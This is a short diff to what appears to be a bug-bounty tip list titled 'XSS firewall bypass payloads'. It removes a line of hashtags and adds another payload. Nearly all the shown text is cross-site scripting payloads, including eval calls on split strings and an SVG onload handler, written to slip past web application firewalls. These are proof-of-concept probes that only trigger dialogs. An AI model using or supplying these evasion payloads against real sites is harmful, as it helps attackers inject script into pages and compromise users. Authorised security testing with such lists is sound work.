@@ -12,5 +12,4 @@ XSS FIREWALL BYPASS PAYLOADS :
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
 "onclick=prompt(8)>"@x.y
-
-#webapplications #scripting #automation #bugbounty #bugbountytips #hackerone #bugcrowd #cybersecurity #vapt
+<Svg Only=1 OnLoad=confirm(1)>
